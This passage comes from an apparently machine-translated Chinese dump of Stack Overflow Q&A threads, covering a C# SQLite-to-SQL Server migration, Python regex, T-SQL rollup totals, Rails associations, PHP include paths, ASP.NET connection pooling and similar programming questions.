      using (SQLiteCommand cmd = new SQLiteCommand("select * from " + tablename, m_sqlitecon))
      {
        using (SQLiteDataReader reader = cmd.ExecuteReader())
        {
          while (reader.Read())
          {
            StringBuilder sql = new StringBuilder();
            sql.Append("insert into " + tablename + " (");
            bool first = true;
            foreach (KeyValuePair<string, string> column in schema)
            {
              if (first)
                first=false;
              else
                sql.Append(",");
              sql.Append("["+column.Key+"]");
            }
            sql.Append(") Values(");
            first = true;
            foreach (KeyValuePair<string, string> column in schema)
            {
              if (first)
                first = false;
              else
                sql.Append(",");
              sql.Append("@");
              sql.Append(column.Key);
            }
            sql.Append(");");
            try
            {
              using (SqlCommand sqlcmd = new SqlCommand(sql.ToString(), m_sqlcon))
              {
                foreach (KeyValuePair<string, string> column in schema)
                {
                  sqlcmd.Parameters.AddWithValue("@" + column.Key, reader[column.Key]);
                }
                int count = sqlcmd.ExecuteNonQuery();
                if (count == 0)
                  throw new Exception("Unable to insert row!");
              }
            }
            catch (Exception Exception) {
              string message = Exception.Message;
              int idx = message.IndexOf("Violation of PRIMARY KEY");
              if (idx < 0)
                throw;
            }
          }
        }
      }
    }

    private static bool SQLTableExists(string tablename)
    {
      using (SqlCommand cmd = new SqlCommand("SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = '" + tablename + "'", m_sqlcon))
      {
        using (SqlDataReader reader = cmd.ExecuteReader())
        {
          if (reader.HasRows)
            return true;
        }
      }
      return false;
    }

    private static string ReplaceCaseInsensitive(string str, string oldValue, string newValue)
    {
      int prevPos = 0;
      string retval = str;
      // find the first occurence of oldValue
      int pos = retval.IndexOf(oldValue, StringComparison.InvariantCultureIgnoreCase);

      while (pos > -1)
      {
        // remove oldValue from the string
        retval = retval.Remove(pos, oldValue.Length);

        // insert newValue in its place
        retval = retval.Insert(pos, newValue);

        // check if oldValue is found further down
        prevPos = pos + newValue.Length;
        pos = retval.IndexOf(oldValue, prevPos, StringComparison.InvariantCultureIgnoreCase);
      }

      return retval;
    }

    static void Main(string[] args)
    {
      // Connect to SQLite and SQL Server database
      m_sqlitecon = new SQLiteConnection("Data Source=C:\\sqlitedatabases\\mydb.sqlite;Version=3;");
      m_sqlitecon.Open();
      m_sqlcon = new SqlConnection("Data Source=localhost;Initial Catalog=mydb;User Id="+userid+";password="+password+";MultipleActiveResultSets=True");
      m_sqlcon.Open();
      string sql = "SELECT * FROM sqlite_master WHERE type='table'";
      SQLiteCommand command = new SQLiteCommand(sql, m_sqlitecon);
      SQLiteDataReader reader = command.ExecuteReader();
      List<string> tables = new List<string>();
      // Loop through all tables
      while (reader.Read())
      {
        string tablename = reader["name"].ToString();
        string sqlstr = reader["sql"].ToString();
        // Only create and import table if it does not exist
        if (!SQLTableExists(tablename))
        {
          Console.WriteLine("Creating table: " + tablename);
          // Vi retter SQLite SQL til M$ SQL Server
          sqlstr = ReplaceCaseInsensitive(sqlstr,"] BOOLEAN", "] bit");
          sqlstr = ReplaceCaseInsensitive(sqlstr,"] BLOB", "] varbinary(max)"); // Note, maks 2 GB i varbinary(max) kolonner
          sqlstr = ReplaceCaseInsensitive(sqlstr,"] VARCHAR", "] nvarchar");
          sqlstr = ReplaceCaseInsensitive(sqlstr, "] nvarchar,", "] nvarchar(max),");
          sqlstr = ReplaceCaseInsensitive(sqlstr, "] nvarchar\r", "] nvarchar(max)\r"); // Case windiows
          sqlstr = ReplaceCaseInsensitive(sqlstr, "] nvarchar\n", "] nvarchar(max)\n"); // Case linux
          sqlstr = ReplaceCaseInsensitive(sqlstr, "] INTEGER", "] int");
          sqlstr = ReplaceCaseInsensitive(sqlstr, "] TEXT", "] nvarchar(max)");
          SqlCommand sqlcmd = new SqlCommand(sqlstr, m_sqlcon);
           sqlcmd.ExecuteNonQuery();
          sqlcmd.Dispose();
          List<KeyValuePair<string, string>> columns = getSQLiteSchema(tablename);
          // Copy all rows to MS SQL Server
          transfer(tablename, columns);
        }
        else
          Console.WriteLine("Table already exists: " + tablename);
      }
    }
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T03:53:18.143

存在用于 SQLite的[ODBC 驱动程序。](http://www.ch-werner.de/sqliteodbc/)如果您有权访问 SSIS 安装，则可以使用数据导入任务导入表。使用 SQL Server 导入/导出向导更容易。

另一种选择是为 SQLite 数据库创建一个 ODBC DSN，然后使用[OPENROWSET](http://msdn.microsoft.com/en-us/library/ms190312.aspx)将数据直接从 SQLite 选择到 SQL Server。

# android - 来自谷歌播放的客户奇怪异常

> ID：13076925
> 
> 赞同：1
> 
> 时间：2012-10-25T20:43:25.580
> 
> 标签：android

我收到了这个例外：

```
java.lang.NullPointerException 
at com.callsfreecalls.android.SmsSend$4.onClick(SmsSend.java:179) 
at android.view.View.performClick(View.java:3538) 
at android.view.View$PerformClick.run(View.java:14330) 
at android.os.Handler.handleCallback(Handler.java:608) 
at android.os.Handler.dispatchMessage(Handler.java:92) 
at android.os.Looper.loop(Looper.java:156) 
at android.app.ActivityThread.main(ActivityThread.java:4987) 
at java.lang.reflect.Method.invokeNative(Native Method) 
at java.lang.reflect.Method.invoke(Method.java:511) 
at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784) 
at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551) 
at dalvik.system.NativeStart.main(Native Method) 
```

为了代码的和平：

```
editSmsText = (EditText) findViewById(R.id.editSmsText);
editSmsText.setOnKeyListener(new OnKeyListener() {
    public boolean onKey(View v, int keyCode, KeyEvent event) {
        // If the event is a key-down event on the "enter" button
        if ((event.getAction() == KeyEvent.ACTION_DOWN) && (keyCode == KeyEvent.KEYCODE_ENTER)) { // <- this is line 179
            // Perform action on key press
            //adapter.add(new OneComment(false, editSmsText.getText().toString()));
            //editSmsText.setText("");
            return true;
        }
        return false;
    }
});

private EditText editSmsText; 
```

有什么建议吗？将editSmsText推到静态？

# python - python：用减号替换精确

> ID：13076927
> 
> 赞同：1
> 
> 时间：2012-10-25T20:43:32.820
> 
> 标签：python, regex

给定以下字符串：

```
"-local locally local test local." 
```

我的目标是用“we”替换字符串“local”，这样结果就变成了

```
"-local locally we test local." 
```

到目前为止（在 stackoverflow 的帮助下：[Python：find exact match](https://stackoverflow.com/questions/13070566/python-find-exact-match)）我已经能够想出以下正则表达式：

```
variable='local'
re.sub(r'\b%s([\b\s])' %variable, r'we\1', "-local locally local test local.") 
```

但是，这段代码有两个问题：

1.  搜索通过减号，输出变为：

    ```
    '-we locally we test local.' 
    ```

    它应该在哪里

    ```
    '-local locally we test local.' 
    ```

2.  搜索以减号开头的字符串，例如“-local”，搜索失败

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T20:47:24.623

您可以使用空格作为分隔符将字符串分隔为子字符串。然后检查每个字符串，替换它是否与您要查找的内容匹配，然后重新组合它们。

当然效率不高:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T20:50:44.637

尝试以下操作：

```
re.sub(r'(^|\s)%s($|\s)' % re.escape(variable), r'\1we\2', some_string) 
```

在另一个问题中建议的正则表达式有点奇怪，因为`\b`在字符类中意味着退格字符。

基本上你现在拥有的是一个正则表达式，它在开头搜索带有单词边界的目标字符串（从单词字符到非单词字符，反之亦然），最后是一个空白字符。

由于您不想匹配最终的“本地”，因为它后面跟着一个句点，我不认为单词边界是这里的方法，而是您应该寻找空格或字符串的开头/结尾，这是上面的正则表达式所做的。

我还在`re.escape`变量上使用过，这样如果您在目标字符串中包含一个字符，例如`.`或`$`通常具有特殊含义的字符，它们将被转义并解释为文字字符。

例子：

```
>>> s = "-local locally local test local."
>>> variable = 'local'
>>> re.sub(r'(^|\s)%s($|\s)' % re.escape(variable), r'\1we\2', s)
'-local locally we test local.'
>>> variable = '-local'
>>> re.sub(r'(^|\s)%s($|\s)' % re.escape(variable), r'\1we\2', s)
'we locally local test local.' 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T20:50:48.863

```
sed 's/ local / we /g' filename 
```

我不做python，但想法只是在模式中的local前后放一个空格来查找，并在替换中包含空格。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T20:56:49.980

如果您只想替换由空格分隔的单词的所有出现，您可以拆分字符串并对结果列表进行操作：

```
search = "local"
replace = "we"
s = "-local locally local test local."
result = ' '.join([x if not x == search else replace for x in s.split(" ")]) 
```

# c# - 为什么在 POP3 中调用 .Disconnect() 方法后电子邮件仍然可见？

> ID：13076930
> 
> 赞同：0
> 
> 时间：2012-10-25T20:43:38.513
> 
> 标签：c#, pop3, disconnect

有人可以帮我找出发生了什么吗？

我的代码连接到电子邮件>读取正文>解析数据>将它们保存到数据库>删除电子邮件。它做得很好。我通过检索他们的 emailId 进行了检查。这里的问题是电子邮件在 Gmail 收件箱中仍然可见，尽管 Disconnect 方法应该从服务器中物理删除它们。为什么它们仍在收件箱中？这正常吗？从收件箱中删除电子邮件是否需要一些时间？或者它总是在收件箱中可见？或者从服务器物理删除电子邮件是否意味着它们已从收件箱中删除？

一些在 c# 中具有 POP3 经验的机构可以帮助我解决这个问题吗？

谢谢，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T21:14:09.657

Gmail 有一项设置可让您从 POP 中删除邮件。请参阅以下内容：http: [//support.google.com/mail/bin/answer.py ?hl=en&answer=13290](http://support.google.com/mail/bin/answer.py?hl=en&answer=13290)

# java - 二维数组的双行长度

> ID：13076932
> 
> 赞同：2
> 
> 时间：2012-10-25T20:43:39.870
> 
> 标签：java, arrays

当我向它添加值时，我试图将二维数组的长度加倍。我知道一维数组的代码是：

```
int oneD[] = new int[10];
//fill array here

oneD = Arrays.copyOf(oneD, 2 * oneD.length); 
```

因此，如果我有一个 2D 数组并且只想在保持 2 列的同时将行数增加一倍，我想我会这样做：

```
int twoD[][] = new int[10][2];
//fill array here

twoD = Arrays.copyOf(twoD, 2* twoD.length); 
```

然而，这似乎不适用于二维数组。如何将二维数组的长度加倍。在这种情况下，改为 [20][2]。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T20:46:14.030

Java 中的二维数组是数组的数组。为了将它加倍，您必须手动迭代数组中的每一行并依次复制其所有列。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T21:10:29.307

在你的情况下，这样的事情可以完成：

```
public static <T> T[][] copyOf(T[][] array, int newLength) {
    // ensure that newLength >= 0
    T[][] copy = new T[newLength][];
    for (int i = 0; i < copy.length && i < array.length; i++) {
        copy[i] = Arrays.copyOf(array[i], array[i].length);
        // this should also work, just not create new array instances:
        // copy[i] = array[i];
    }
    return copy;
} 
```

你可以调用这个方法，就像你调用的一样`Arrays.copyOf()`

# javascript - 清除分层画布文本

> ID：13076937
> 
> 赞同：0
> 
> 时间：2012-10-25T20:44:00.993
> 
> 标签：javascript, html, canvas

我有一个关于我正在试验的分层画布元素的问题。

如果我有两个画布，一个 (c1) z-index 1 和第二个 (c2) z-index 2，在顶部分层，将文本写入 c2 并清除它的最佳方法是什么？到目前为止，我已经尝试了几种方法，但似乎没有一个是完美的。

1.  当我尝试简单地用背景颜色覆盖文本时，我的文本会留下轻微的轮廓，就好像我的 Photoshop 工作做得很糟糕！

2.  如果我尝试在具有背景颜色的 c2 画布上使用 clearRect() ，它显然会使 c2 画布背景变得纯色并遮盖 c1 画布的一部分。

3.  如果我尝试在 c1 画布上绘制文本并使用 clearRext，当精灵移动到该区域后面时，它会闪烁，因为在重绘之前将精灵区域设置为背景区域。

对这里的明智方法有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T04:12:17.393

我正要发帖，只是做 clearRect()，但后来我记得你有一个问题。您能否发布您的代码，以便我们更好地了解正在发生的事情？

上下文中的 clearRect 函数将该区域中的数据设置为 0。因此，我对它如何使您的背景变得坚实感到困惑。

```
ctx2.clearRect(0,0,100,100);
// this should just clear the canvas2 
```

[这](http://jsfiddle.net/crzyman/CHWkJ/)是我的意思的一个jsfiddle。

# ruby-on-rails-3 - 如何处理每个迭代器？

> ID：13076944
> 
> 赞同：0
> 
> 时间：2012-10-25T20:44:27.980
> 
> 标签：ruby-on-rails-3

我想在视图页面的一个表中打印取自数据库中两个不同表的值。我不知道如何处理两个每个迭代器，因为它的行为异常，即多次打印一个值。我很困惑。请帮忙。

这是我的代码

在控制器中：

```
class ListController < ApplicationController

  def all
    @books = Book.all   
    @susers = SUser.all    
  end
end 
```

在我的视图页面中

```
<tbody>                     
  <% @books.each do |b| %>
    <% if b.branch == "I.T" %>                                      
      <tr>
        <td><%= b.id %></td>
        <td><%= b.book_name %></td>
        <td><%= b.year %></td>
        <td><%= b.user_id %></td>    

        <% @susers.each do |s| %>                   
          <% if s.user_id == b.user_id %>
            <td><%= s.address %></td>
          <% else %>
            <td>Error..!!</td>
          <% end %>
        <% end %>                       
      </tr> 
    <% else %>
      <% puts "No any book of this branch" %>   
    <% end %>                                       
  <% end %>                                 
</tbody> 
```

输出显示如下

第一条语句的`else`部分`if`是一次又一次地重复它自己。我不知道为什么会这样？![您可以看到错误部分打印了四次，因为 book 表在数据库中有 4 本书。](../Images/4ae05a9177d3cd890aac1762f09fbad4.png)

这个项目有3个模型。1\. 用户 - 由设计制作 2\. 书籍 3\. SUser

一件重要的事情： - 实际上我制作了 SUser 模型，因为我想存储用户的个人详细信息，例如姓名、地址、电话号码。我不想触摸设计模型（用户），所以我制作了另一个模型 SUser，它与设计模型（用户）具有一对一的关系。

用户型号：

```
class User < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :token_authenticatable, :confirmable,
  # :lockable, :timeoutable and :omniauthable
  has_and_belongs_to_many :books
  has_one :s_user
  devise :database_authenticatable, :registerable,
       :recoverable, :rememberable, :trackable, :validatable

  # Setup accessible (or protected) attributes for your model
  attr_accessible :email, :password, :password_confirmation, :remember_me
  # attr_accessible :title, :body

end 
```

图书型号：

```
class Book < ActiveRecord::Base
  # attr_accessible :title, :body
  has_and_belongs_to_many :users
  belongs_to :s_user, :class_name => "SUser"
  attr_accessible :id, :user_id, :book_name, :edition, :author, :branch, :publisher,      :year, :details 
end 
```

S用户型号：

```
class SUser < ActiveRecord::Base
  # attr_accessible :title, :body
  has_one :user
  has_many :books
  attr_accessible :user_id, :fullname, :email, :address, :details 
end 
```

迁移文件：

```
class CreateBooks < ActiveRecord::Migration
  def change
    create_table :books do |t|
    t.integer "user_id", :limit =>5
    t.string "book_name", :limit => 50
    t.integer "edition", :limit => 5
    t.string "author", :limit => 30
    t.string "branch", :limit => 30
    t.string "publisher", :limit => 50
    t.integer "year", :limit => 10     
    t.text "details"
    t.timestamps
  end
  add_index :books, "user_id"
 end
end 
```

SUser 迁移文件

```
class CreateSUsers < ActiveRecord::Migration
 def change
  create_table :s_users do |t|
    t.integer "user_id", :limit => 5
    t.string "fullname", :limit => 25            
    t.string "email", :default => "", :null => false
    t.string "hashed_password", :limit => 40
    t.string "salt", :limit => 40
    t.string "address",:limit => 25
    t.text "details"
    t.timestamps
  end
  add_index :s_users, "user_id"
 end
end 
```

我在用户和书之间建立了多对多的关系，因为一个用户有很多书，而一本书可以供许多用户使用。所以我为多对多关联制作了一个简单的连接表

```
class CreateBooksUsersJoin < ActiveRecord::Migration
 def up
   create_table :books_users, :id => false do |t|
     t.integer "book_id"
     t.integer "user_id"
   end
  add_index :books_users, ["book_id", "user_id"]
 end

 def down
  drop_table :book_users
 end
end 
```

大声笑..我已将整个代码粘贴在这里。实际上我是 Rails 新手。如果您发现此代码有任何其他缺陷，请指导我。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:56:38.923

您可以定义模型之间的关系，我认为`one to many`关系类型适合您的情况：

```
class Book < ActiveRecord::Base
  belongs_to :suser, :class_name => "SUser"
end

class SUser < ActiveRecord::Base
  has_many :books
end 
```

然后在你的控制器中你可以这样写：

```
class ListController < ApplicationController
  def all
   @books = Book.includes(:suser).all
  end
end 
```

最后，您的视图将如下所示：

```
<tbody>                     
<% @books.each do |b| %>
  <% if b.branch == "I.T"%>                                       
  <tr>
    <td><%= b.id%></td>
    <td><%= b.book_name%></td>
    <td><%= b.year%></td>
    <td><%= b.user_id%></td>    
    <td><%= b.suser.try(:address) %></td>
  </tr>   
  <%else%>
    <% puts "No any book of this branch"%>  
  <%end%>                                     
<%end%>                                 
</tbody> 
```

*PS*：你有重复`else`块是正常的，因为你检查每个用户是否`book.suser_id == suser_id`（但书籍和用户之间存在一对多关系，所以书籍只属于一个用户，如果你有多对多关系，则很少）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:59:28.883

```
class Book < ActiveRecord::Base
  belongs_to :suser
end

class SUser
  has_many :books
end

class ListController < ApplicationController
  def all
    @books = Book.includes(:susers).all
  end
end

<tbody>                     
<% @books.each do |b| %>
  <% if b.branch == "I.T"%>                                       
  <tr>
    <td><%= b.id%></td>
    <td><%= b.book_name%></td>
    <td><%= b.year%></td>
    <td><%= b.user_id%></td>    
    <td><%= b.suser.address %></td>
  </tr>   
  <%else%>
    <% puts "Branch has no books"%>  
  <%end%>                                     
<%end%>                                 
</tbody> 
```

最后，您将需要关系的外键，例如：

```
script/generate migration add_user_id_to_books 
```

迁移语法可能很棘手，因此打开迁移文件（在 db/migrate 中）并确保它正在执行类似于 add_column 的操作：books, user_id, integer

# c++ - 如何知道基于项目的ListView Qt C++中是否存在字符串

> ID：13076953
> 
> 赞同：0
> 
> 时间：2012-10-25T20:44:56.703
> 
> 标签：c++, qt, listview

我想知道一个字符串是否存在于 C++ 中带有 Qt 的列表视图的任何项目中，该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T21:02:25.900

也许这个小迭代函数可以满足您的需求：

```
bool doesContain(QListView *listView, QString expression)
{
    QAbstractItemModel* model = listView->model() ;
    int rowCount = model->rowCount();
    int columnCount = model->columnCount();

    for(int i = 0; i < rowCount; i++)
        for(int j = 0; j < columnCount; j++)
            if(model->index(i, j).data(Qt::DisplayRole).toString().contains(expression))
                return true;

    return false;
} 
```

# javascript - 如何通过 POST 提交 Javascript 生成的位图图像？

> ID：13076954
> 
> 赞同：5
> 
> 时间：2012-10-25T20:44:56.843
> 
> 标签：javascript, post, bitmap

如果我通过 javascript 在客户端[创建动态位​​图](http://www.codeproject.com/Articles/221941/HTMLImage-Generating-Dynamic-Image-using-Plain-Jav)，我如何通过 POST 或 GET 提交它（然后从服务器端的位图中解析出值？NodeJS、PHP 等）

从[在 Javascript 中逐字节制作图像](http://mrcoles.com/blog/making-images-byte-by-byte-javascript/)

`var src = 'data:image/bmp;base64,' + myBase64EncodedData;`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T20:51:30.807

只需上传 base 64 数据。以您喜欢的任何方式在服务器端表单上解析它。

HTML：

```
<form id="uploadImage" method="POST">
  <input type="hidden" name="imageData64" id="imageData64"/>
  <input type="submit" value="upload"/>
<form> 
```

JS：

```
document.getElementById('uploadImage').onsubmit = function() {
  document.getElementById('imageData64').value = myBase64EncodedData;
}; 
```

或者你可以对 ajax 请求做同样的事情。

不过，您可能不想使用 GET。部分原因是它不合适，您没有从服务器检索任何内容。但更多的是因为 GET 对 URL 长度设置了一些限制，所以您的图像数据可能不适合。POST 没有这样的限制，因为请求可以有一个主体，这与 GET 不同。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T21:19:17.860

你可以使用这样的帖子..

HTML

```
<img src="whatever.jpg" id="myimage" />
<div id="button" data-role="button">Click on button</div> 
```

JS

```
 $(function() {
        $("#button").click(function() {
              postImageData();
            });
    });

            function postImageData(){
var img = document.getElementById('myimage')
var myBase64EncodedData  = getBase64Image(img);
                $.ajax({
                    type: 'POST',
                    url: 'http://same_domain_url.com/',
                    data: { 
                        'imagedata': myBase64EncodedData 
                          },
                    success: function(msg){
                        console.log('posted' + msg);
                    }
                });
            } 
```

php

```
 $imagedata=$_POST['imagedata']; 
```

对于 getBase64Image 函数，请参阅这个 SO 问题 [Get image data in JavaScript?](https://stackoverflow.com/questions/934012/get-image-data-in-javascript)

# tfs - 更改 Team Foundation Server 上的默认分支名称

> ID：13076956
> 
> 赞同：0
> 
> 时间：2012-10-25T20:45:01.350
> 
> 标签：tfs

每次我发布版本时，我都会对我的代码进行分支，这样做时，它会为我建议一个分支名称，这只是我的原始分支名称，末尾附加了 -branch。这很烦人，因为我将此分支放在单独的文件夹中，并且每次都必须删除“-branch”部分。有没有办法将 TFS 配置为不这样做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:51:20.053

我已经阅读了大部分 TFS 书籍和 ALM 游侠指南，但我从未将其视为一项功能，所以我愿意打赌**不**——除非那里有不受支持的黑客攻击，但我会感到惊讶。

大多数人不会有这个问题，因为他们在发布后命名他们的分支。这意味着少了 1 层嵌套，这在 TFS 2010 中可能是源代码管理中路径名长的问题。

# iphone - AVCaptureVideoPreview 方向 iOS 6

> ID：13076958
> 
> 赞同：1
> 
> 时间：2012-10-25T20:45:11.303
> 
> 标签：iphone, xcode, ios6, uiimagepickercontroller, avcapturesession

由于`[AVCaptureVideoPreviewLayer setOrientation]`在 iOS 6 中已弃用，我正在尝试使用`[AVCaptureConnection videoOrientation:AVCaptureVideoOrientationLandscapeLeft];`，但我收到一条错误消息：“'AVCaptureConnection' 没有可见的@interface 声明选择器'videoOrientation'。”我一直在尝试研究适用于 iOS 6 的 AVCaptureVideo SDK，但我没有运气。我也尝试重新创建 AVCaptureConnection 但我没有这样做。这是我部分使用的代码的网络参考。[http://red-glasses.com/index.php/tutorials/ios4-take-photos-with-live-video-preview-using-avfoundation/](http://red-glasses.com/index.php/tutorials/ios4-take-photos-with-live-video-preview-using-avfoundation/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:50:21.720

哇。男孩，我觉得自己很愚蠢`[AVCaptureConnection setVideoOrientation:AVCaptureVideoOrientation];`

# sql - T-SQL 总和

> ID：13076962
> 
> 赞同：0
> 
> 时间：2012-10-25T20:45:28.190
> 
> 标签：sql, sql-server, tsql, sql-server-2000

下面我有一个 T-SQL 查询，它带回购买商品的数量、折扣和总数——按购买的月/年分组。如何更新查询以返回总计行，我可以将总计列中的金额相加？能够将所有行加起来会很好，但我的主要项目是我需要能够获得总计。谢谢。

```
 Select DATENAME(month, [OrderDate]) + ' ' + CAST(YEAR(OrderDate) AS CHAR(4)) 
    AS [Month],
    SUM(Amount) AS [Amount],
    SUM(Discount1) AS [Discount 1],
    SUM(Discount2) AS [Discount 2],
    SUM(Amount - Discount1 - Discount2) AS [Total]
    From 
    Orders
    JOIN Customer on orders.cust_ky=customer.cust_ky
    GROUP BY DATENAME(month, [OrderDate]) + ' ' + CAST(YEAR(OrderDate) AS CHAR(4))
    ORDER BY MAX(OrderDate) 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T20:49:37.030

根据您的 sql-server 版本，您可能能够实现汇总功能（SQL-Server 2005+）：

```
Select DATENAME(month, [OrderDate]) + ' ' + CAST(YEAR(OrderDate) AS CHAR(4)) AS [Month],
    SUM(Amount) AS [Amount],
    SUM(Discount1) AS [Discount 1],
    SUM(Discount2) AS [Discount 2],
    SUM(Amount - Discount1 - Discount2) AS [Total]
From Orders
JOIN Customer 
    on orders.cust_ky=customer.cust_ky
GROUP BY ROLLUP(DATENAME(month, [OrderDate]) + ' ' + CAST(YEAR(OrderDate) AS CHAR(4)))
ORDER BY MAX(OrderDate) 
```

或者您可以使用`UNION ALL`与此类似的方法，其中第二个查询获取总数而没有`GROUP BY`：

```
Select DATENAME(month, [OrderDate]) + ' ' + CAST(YEAR(OrderDate) AS CHAR(4)) AS [Month],
    SUM(Amount) AS [Amount],
    SUM(Discount1) AS [Discount 1],
    SUM(Discount2) AS [Discount 2],
    SUM(Amount - Discount1 - Discount2) AS [Total]
From Orders
JOIN Customer 
    on orders.cust_ky=customer.cust_ky
GROUP BY DATENAME(month, [OrderDate]) + ' ' + CAST(YEAR(OrderDate) AS CHAR(4))
union all
Select 'Total',
    SUM(Amount) AS [Amount],
    SUM(Discount1) AS [Discount 1],
    SUM(Discount2) AS [Discount 2],
    SUM(Amount - Discount1 - Discount2) AS [Total]
From Orders
JOIN Customer 
    on orders.cust_ky=customer.cust_ky 
```

# file - 使用带有文件名的存储桶搜索 s3 存储桶中的文件

> ID：13076967
> 
> 赞同：3
> 
> 时间：2012-10-25T20:45:44.473
> 
> 标签：file, search, amazon-s3, filenames, boto

假设我在一个存储桶中上传了一个文件，并且同一个存储桶中已经有大约 1000 个文件。现在我想通过文件名搜索文件是否在存储桶中。帮助表示赞赏。因为我找不到任何此类文件。如果有人尝试过，请发表您的评论:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T21:01:55.007

S3 API 中没有搜索功能。如果您知道文件的确切名称，您可以向 S3 存储桶中的该对象发出 HEAD 请求（boto lookup() 方法执行此操作），如果您从服务器收到 200 响应，那么您知道文件在那里. 如果您收到 404，则它不存在。

如果您不知道要查找的文件的确切名称，您真正可以做的就是列出存储桶的内容，直到找到您要查找的文件。这是非常低效的，如果您需要定期执行此操作，我建议将文件名存储在一个单独的数据库中，这样您就可以有效地搜索。

# javascript - 如何将表单转换为数组键值

> ID：13076968
> 
> 赞同：2
> 
> 时间：2012-10-25T20:46:00.500
> 
> 标签：javascript, arrays, forms

如何将表单内容转换为数组键值？这是我试过的一个例子：

```
 function formToArray(){
    var sAux=Array();
    var frm = document.getElementById("formUsuario");
    for (i = 0; i < frm.elements.length; i++) {

        //next line dont work
        sAux[frm.elements[i].name] = frm.elements[i].value;

    }
    alert(sAux);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:47:19.710

您应该使用 object 而不是 array.following 应该可以解决您的问题。（假设 formUsuario 是一个表单 ID）。[jsfiddle](http://jsfiddle.net/H3kSL/)

```
function formToArray(){
    var sAux={};
    var frm = document.getElementById("formUsuario");
    for (i = 0; i < frm.length; i++) {

        //next line dont work
        sAux[frm[i].name] = frm[i].value;

    }
    alert(sAux);
} 
```

# php - PHP 在路径中包含一个变量

> ID：13076974
> 
> 赞同：8
> 
> 时间：2012-10-25T20:46:27.950
> 
> 标签：php, variables, path, include

因此，我们构建的网站必须从本地开发服务器移植到测试服务器，然后再移植到实时服务器。为此，我们创建了一个变量：

```
<?php $path = '/_Folder_/_SubFolder_'; ?> 
```

当我们将网站从服务器移到下一个时，想法是简单地更改 $path 定义以改造新的开发服务器。目前，在我们调用包含的每个页面上，我们都会写：

```
<?php include('../_includes/_css.php'); ?> 
```

**但我想做的是：**

```
<?php include($path.'/_includes/_css.php'); ?> 
```

**我希望的结果是：**

```
<?php include('/_Folder_/_SubFolder_/_includes/_css.php'); ?> 
```

**我一直惨败导致：**

> 警告：包含（/*文件夹*/_SubFolder_/_includes/_css.php）[function.include]：无法打开流：C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\FREEDOM2012_FREEDOM2012_DEFAULT_\ 中没有这样的文件或目录第 15 行的住宿\guest-rooms.php

**其他问题**我仍然需要通过调用“../”来包含变量源

```
<?php include('../_includes/_var.php'); ?> 
```

如果有人对我如何更有效地做到这一点有任何见解，我将不胜感激。非常感谢您在回复中付出的时间、耐心和努力。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T21:02:26.150

您需要显示上一个目录：

```
<?php include('../_includes/_css.php'); ?> 
```

因为你有`../`，如果你的完整路径是`css.php = /_Folder_/_SubFolder_/_includes/_css.php`，那么你需要使用这个：

```
<?php $path = './_Folder_/_SubFolder_';
include($path.'/_includes/_css.php'); ?> 
```

否则，首先显示文件的完整路径`_css.php`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T20:51:22.607

你为什么不永远动态地初始化你的 $path 变量并且与环境无关？

喜欢：

```
$path = dirname(__FILE__); 
```

从 PHP 5.3 开始，您还可以使用`__DIR__`与上述相同的快捷方式。

@see：[http ://www.php.net/manual/en/language.constants.predefined.php](http://www.php.net/manual/en/language.constants.predefined.php)

# c# - 以下哪个代码在 ASP.NET 2.0 中性能更好

> ID：13076980
> 
> 赞同：0
> 
> 时间：2012-10-25T20:46:50.340
> 
> 标签：c#, sql-server-2005, asp.net-2.0

我一直在使用数据表来显示我的网站中 SQL 2005 数据库表中的一些字段，该网站是在 ASP.NET 2.0 中构建的。

最近它一直在抛出超时错误，说已经达到所有最大连接池。

这是我使用 SqlDataAdapter 在Repeater OnDataItemBound 上执行此操作的代码。

```
#region repeater item databound
    protected void rProducts_OnItemDataBound(object source, RepeaterItemEventArgs e)
    {

        // displaying sale and original price //
        Label lblitemid = e.Item.FindControl("itemID") as Label;
        decimal strOP;
        decimal strSP;
        string salequery = "select SaleItemNo, OriginalPrice, SalePrice, OriginalPriceRange, SalePriceRange from SaleItems where CatalogItemId='" + lblitemid.Text + "'";
        SqlConnection myconnection1 = new SqlConnection(ConfigurationManager.ConnectionStrings["DBconnection"].ConnectionString);
        SqlCommand SqlCmd1 = null;
        SqlCmd1 = new SqlCommand(salequery, myconnection1);
        SqlDataAdapter ad1 = new SqlDataAdapter(SqlCmd1);
        DataTable dt1 = new DataTable();
        ad1.Fill(dt1);

        Label lbloriprice = e.Item.FindControl("originalprice") as Label;
        if (dt1.Rows[0]["OriginalPrice"].ToString() == "" || dt1.Rows[0]["OriginalPrice"].ToString() == "0.00")
        {
            lbloriprice.Attributes.Add("style", "display:none");
        }
        else
        {
            strOP = Convert.ToDecimal(dt1.Rows[0]["OriginalPrice"].ToString());
            lbloriprice.Text = strOP.ToString("c");
        }

        Label lbloprange = e.Item.FindControl("opRange") as Label;
        if (dt1.Rows[0]["OriginalPriceRange"].ToString() != "")
        {
